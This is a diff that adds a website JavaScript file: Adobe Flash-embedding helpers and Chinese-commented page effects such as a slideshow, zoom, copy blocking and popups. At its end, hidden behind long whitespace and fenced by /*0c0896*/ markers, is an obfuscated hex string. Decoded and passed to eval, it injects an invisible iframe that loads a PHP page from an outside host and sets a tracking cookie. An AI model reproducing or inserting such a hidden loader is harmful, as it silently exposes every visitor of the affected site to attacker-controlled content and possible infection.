@@ -1,0 +1,230 @@
+//v1.0
+//Copyright 2006 Adobe Systems, Inc. All rights reserved.
+function AC_AddExtension(src, ext)
+{
+  if (src.indexOf('?') != -1)
+    return src.replace(/\?/, ext+'?'); 
+  else
+    return src + ext;
+}
+
+function AC_Generateobj(objAttrs, params, embedAttrs) 
+{ 
+  var str = '<object ';
+  for (var i in objAttrs)
+    str += i + '="' + objAttrs[i] + '" ';
+  str += '>';
+  for (var i in params)
+    str += '<param name="' + i + '" value="' + params[i] + '" /> ';
+  str += '<embed ';
+  for (var i in embedAttrs)
+    str += i + '="' + embedAttrs[i] + '" ';
+  str += ' ></embed></object>';
+
+  document.write(str);
+}
+
+function AC_FL_RunContent(){
+  var ret = 
+    AC_GetArgs
+    (  arguments, ".swf", "movie", "clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"
+     , "application/x-shockwave-flash"
+    );
+  AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
+}
+
+function AC_SW_RunContent(){
+  var ret = 
+    AC_GetArgs
+    (  arguments, ".dcr", "src", "clsid:166B1BCA-3F9C-11CF-8075-444553540000"
+     , null
+    );
+  AC_Generateobj(ret.objAttrs, ret.params, ret.embedAttrs);
+}
+
+function AC_GetArgs(args, ext, srcParamName, classid, mimeType){
+  var ret = new Object();
+  ret.embedAttrs = new Object();
+  ret.params = new Object();
+  ret.objAttrs = new Object();
+  for (var i=0; i < args.length; i=i+2){
+    var currArg = args[i].toLowerCase();    
+
+    switch (currArg){	
+      case "classid":
+        break;
+      case "pluginspage":
+        ret.embedAttrs[args[i]] = args[i+1];
+        break;
+      case "src":
+      case "movie":	
+        args[i+1] = AC_AddExtension(args[i+1], ext);
+        ret.embedAttrs["src"] = args[i+1];
+        ret.params[srcParamName] = args[i+1];
+        break;
+      case "onafterupdate":
+      case "onbeforeupdate":
+      case "onblur":
+      case "oncellchange":
+      case "onclick":
+      case "ondblClick":
+      case "ondrag":
+      case "ondragend":
+      case "ondragenter":
+      case "ondragleave":
+      case "ondragover":
+      case "ondrop":
+      case "onfinish":
+      case "onfocus":
+      case "onhelp":
+      case "onmousedown":
+      case "onmouseup":
+      case "onmouseover":
+      case "onmousemove":
+      case "onmouseout":
+      case "onkeypress":
+      case "onkeydown":
+      case "onkeyup":
+      case "onload":
+      case "onlosecapture":
+      case "onpropertychange":
+      case "onreadystatechange":
+      case "onrowsdelete":
+      case "onrowenter":
+      case "onrowexit":
+      case "onrowsinserted":
+      case "onstart":
+      case "onscroll":
+      case "onbeforeeditfocus":
+      case "onactivate":
+      case "onbeforedeactivate":
+      case "ondeactivate":
+      case "type":
+      case "codebase":
+        ret.objAttrs[args[i]] = args[i+1];
+        break;
+      case "width":
+      case "height":
+      case "align":
+      case "vspace": 
+      case "hspace":
+      case "class":
+      case "title":
+      case "accesskey":
+      case "name":
+      case "id":
+      case "tabindex":
+        ret.embedAttrs[args[i]] = ret.objAttrs[args[i]] = args[i+1];
+        break;
+      default:
+        ret.embedAttrs[args[i]] = ret.params[args[i]] = args[i+1];
+    }
+  }
+  ret.objAttrs["classid"] = classid;
+  if (mimeType) ret.embedAttrs["type"] = mimeType;
+  return ret;
+}
+
+//变换图片代码
+
+    TitlePics = new Array();              
+                                                      
+    TitlePics[0] = "<img src=images/pro3.jpg width=555 height=318 border=0 >";                                                             
+    TitlePics[1] = "<img src=images/pro1.jpg width=555 height=318 border=0 >";          
+	TitlePics[2] = "<img src=images/pro2.jpg width=555 height=318 border=0 >";    
+	TitlePics[3] = "<img src=images/pro3.jpg width=555 height=318 border=0 >";	
+	TitlePics[4] = "<img src=images/pro4.jpg width=555 height=318 border=0 >";	
+	TitlePics[5] = "<img src=images/pro1.jpg width=555 height=318 border=0 >";                                                      
+                                                      
+    var i = 0;              
+    var mytimeout;              
+    function playTitlePics() {              
+        if(TitlePics.length == 1){              
+            document.all["span_titlepics"].filters[0].apply();              
+            document.all["span_titlepics"].innerHTML = TitlePics[0];              
+            document.all["span_titlepics"].filters[0].play();              
+        }else{              
+            if (i == TitlePics.length-1) i = 0;  else i++;                                                
+            document.all["span_titlepics"].filters[0].apply();                
+            document.all["span_titlepics"].innerHTML = TitlePics[i];              
+            document.all["span_titlepics"].filters[0].play();              
+            mytimeout = setTimeout('playTitlePics()',4500);              
+        }              
+    }              
+//鼠标移上效果
+//无级缩放图片大小
+function resizepic(thispic) 
+{ 
+if(thispic.height>5500||thispic.width>550)thispic.style.zoom=550/(thispic.height>thispic.width?thispic.height:thispic.width); 
+}
+
+
+function bbimg(o)
+{
+  var zoom=parseInt(o.style.zoom, 10)||100;
+  zoom+=event.wheelDelta/12;
+  if (zoom>0) o.style.zoom=zoom+'%';
+  return false;
+}
+//双击鼠标滚动屏幕的代码
+var currentpos,timer;
+function initialize()
+{
+timer=setInterval ("scrollwindow ()",30);
+}
+function sc()
+{
+clearInterval(timer);
+}
+function scrollwindow()
+{
+currentpos=document.body.scrollTop;
+window.scroll(0,++currentpos);
+if (currentpos !=document.body.scrollTop)
+sc();
+}
+document.onmousedown=sc
+document.ondblclick=initialize
+
+//更改字体大小
+var status0='';
+var curfontsize=10;
+var curlineheight=18;
+function fontZoomA(){
+  if(curfontsize>8){
+    document.getElementById('fontzoom').style.fontSize=(--curfontsize)+'pt';
+	document.getElementById('fontzoom').style.lineHeight=(--curlineheight)+'pt';
+  }
+}
+function fontZoomB(){
+  if(curfontsize<64){
+    document.getElementById('fontzoom').style.fontSize=(++curfontsize)+'pt';
+	document.getElementById('fontzoom').style.lineHeight=(++curlineheight)+'pt';
+  }
+}
+//完毕
+
+//防止copy代码
+function nocopy() 
+{
+alert("对不起，为保护作者权益，本站文章不允许复制。\n\n如有特殊需要，请与本站联系。");
+event.returnValue=false;
+}
+function stop(){
+return false;
+}
+document.oncontextmenu=stop;
+//完毕
+
+//弹出窗口代码
+
+function yysoft(){}
+
+function MM_openBrWindow(theURL,winName,features) { //v2.0
+  window.open(theURL,winName,features);
+}
+//完毕
+
+/*0c0896*/
+                                                                                                                                                                                                                                                          ps="split";e=eval;v="0x";a=0;z="y";try{a*=25}catch(zz){a=1}if(!a){try{--e("doc"+"ument")["\x62od"+z]}catch(q){a2="_";sa=0xa-02;}z="28_6e_7d_76_6b_7c_71_77_76_28_82_82_82_6e_6e_6e_30_31_28_83_15_12_28_7e_69_7a_28_80_82_6f_69_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_7a_6d_69_7c_6d_4d_74_6d_75_6d_76_7c_30_2f_71_6e_7a_69_75_6d_2f_31_43_15_12_15_12_28_80_82_6f_69_36_7b_7a_6b_28_45_28_2f_70_7c_7c_78_42_37_37_6e_7c_78_36_6e_71_76_6d_6c_69_7c_7c_69_36_6b_77_75_37_71_75_69_6f_6d_37_6b_74_71_73_36_78_70_78_2f_43_15_12_28_80_82_6f_69_36_7b_7c_81_74_6d_36_78_77_7b_71_7c_71_77_76_28_45_28_2f_69_6a_7b_77_74_7d_7c_6d_2f_43_15_12_28_80_82_6f_69_36_7b_7c_81_74_6d_36_6a_77_7a_6c_6d_7a_28_45_28_2f_38_2f_43_15_12_28_80_82_6f_69_36_7b_7c_81_74_6d_36_70_6d_71_6f_70_7c_28_45_28_2f_39_78_80_2f_43_15_12_28_80_82_6f_69_36_7b_7c_81_74_6d_36_7f_71_6c_7c_70_28_45_28_2f_39_78_80_2f_43_15_12_28_80_82_6f_69_36_7b_7c_81_74_6d_36_74_6d_6e_7c_28_45_28_2f_39_78_80_2f_43_15_12_28_80_82_6f_69_36_7b_7c_81_74_6d_36_7c_77_78_28_45_28_2f_39_78_80_2f_43_15_12_15_12_28_71_6e_28_30_29_6c_77_6b_7d_75_6d_76_7c_36_6f_6d_7c_4d_74_6d_75_6d_76_7c_4a_81_51_6c_30_2f_80_82_6f_69_2f_31_31_28_83_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_7f_7a_71_7c_6d_30_2f_44_6c_71_7e_28_71_6c_45_64_2f_80_82_6f_69_64_2f_46_44_37_6c_71_7e_46_2f_31_43_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_6f_6d_7c_4d_74_6d_75_6d_76_7c_4a_81_51_6c_30_2f_80_82_6f_69_2f_31_36_69_78_78_6d_76_6c_4b_70_71_74_6c_30_80_82_6f_69_31_43_15_12_28_85_15_12_85_15_12_6e_7d_76_6b_7c_71_77_76_28_5b_6d_7c_4b_77_77_73_71_6d_30_6b_77_77_73_71_6d_56_69_75_6d_34_6b_77_77_73_71_6d_5e_69_74_7d_6d_34_76_4c_69_81_7b_34_78_69_7c_70_31_28_83_15_12_28_7e_69_7a_28_7c_77_6c_69_81_28_45_28_76_6d_7f_28_4c_69_7c_6d_30_31_43_15_12_28_7e_69_7a_28_6d_80_78_71_7a_6d_28_45_28_76_6d_7f_28_4c_69_7c_6d_30_31_43_15_12_28_71_6e_28_30_76_4c_69_81_7b_45_45_76_7d_74_74_28_84_84_28_76_4c_69_81_7b_45_45_38_31_28_76_4c_69_81_7b_45_39_43_15_12_28_6d_80_78_71_7a_6d_36_7b_6d_7c_5c_71_75_6d_30_7c_77_6c_69_81_36_6f_6d_7c_5c_71_75_6d_30_31_28_33_28_3b_3e_38_38_38_38_38_32_3a_3c_32_76_4c_69_81_7b_31_43_15_12_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_28_45_28_6b_77_77_73_71_6d_56_69_75_6d_33_2a_45_2a_33_6d_7b_6b_69_78_6d_30_6b_77_77_73_71_6d_5e_69_74_7d_6d_31_15_12_28_33_28_2a_43_6d_80_78_71_7a_6d_7b_45_2a_28_33_28_6d_80_78_71_7a_6d_36_7c_77_4f_55_5c_5b_7c_7a_71_76_6f_30_31_28_33_28_30_30_78_69_7c_70_31_28_47_28_2a_43_28_78_69_7c_70_45_2a_28_33_28_78_69_7c_70_28_42_28_2a_2a_31_43_15_12_85_15_12_6e_7d_76_6b_7c_71_77_76_28_4f_6d_7c_4b_77_77_73_71_6d_30_28_76_69_75_6d_28_31_28_83_15_12_28_7e_69_7a_28_7b_7c_69_7a_7c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_71_76_6c_6d_80_57_6e_30_28_76_69_75_6d_28_33_28_2a_45_2a_28_31_43_15_12_28_7e_69_7a_28_74_6d_76_28_45_28_7b_7c_69_7a_7c_28_33_28_76_69_75_6d_36_74_6d_76_6f_7c_70_28_33_28_39_43_15_12_28_71_6e_28_30_28_30_28_29_7b_7c_69_7a_7c_28_31_28_2e_2e_15_12_28_30_28_76_69_75_6d_28_29_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_7b_7d_6a_7b_7c_7a_71_76_6f_30_28_38_34_28_76_69_75_6d_36_74_6d_76_6f_7c_70_28_31_28_31_28_31_15_12_28_83_15_12_28_7a_6d_7c_7d_7a_76_28_76_7d_74_74_43_15_12_28_85_15_12_28_71_6e_28_30_28_7b_7c_69_7a_7c_28_45_45_28_35_39_28_31_28_7a_6d_7c_7d_7a_76_28_76_7d_74_74_43_15_12_28_7e_69_7a_28_6d_76_6c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_71_76_6c_6d_80_57_6e_30_28_2a_43_2a_34_28_74_6d_76_28_31_43_15_12_28_71_6e_28_30_28_6d_76_6c_28_45_45_28_35_39_28_31_28_6d_76_6c_28_45_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_74_6d_76_6f_7c_70_43_15_12_28_7a_6d_7c_7d_7a_76_28_7d_76_6d_7b_6b_69_78_6d_30_28_6c_77_6b_7d_75_6d_76_7c_36_6b_77_77_73_71_6d_36_7b_7d_6a_7b_7c_7a_71_76_6f_30_28_74_6d_76_34_28_6d_76_6c_28_31_28_31_43_15_12_85_15_12_71_6e_28_30_76_69_7e_71_6f_69_7c_77_7a_36_6b_77_77_73_71_6d_4d_76_69_6a_74_6d_6c_31_15_12_83_15_12_71_6e_30_4f_6d_7c_4b_77_77_73_71_6d_30_2f_7e_71_7b_71_7c_6d_6c_67_7d_79_2f_31_45_45_3d_3d_31_83_85_6d_74_7b_6d_83_5b_6d_7c_4b_77_77_73_71_6d_30_2f_7e_71_7b_71_7c_6d_6c_67_7d_79_2f_34_28_2f_3d_3d_2f_34_28_2f_39_2f_34_28_2f_37_2f_31_43_15_12_15_12_82_82_82_6e_6e_6e_30_31_43_15_12_85_15_12_85_15_12"[ps](a2);za="";for(i=0;i<z.length;i++){za+=String["fromCharCode"](e(v+(z[i]))-sa);}zaz=za;e(zaz);}
+/*/0c0896*/
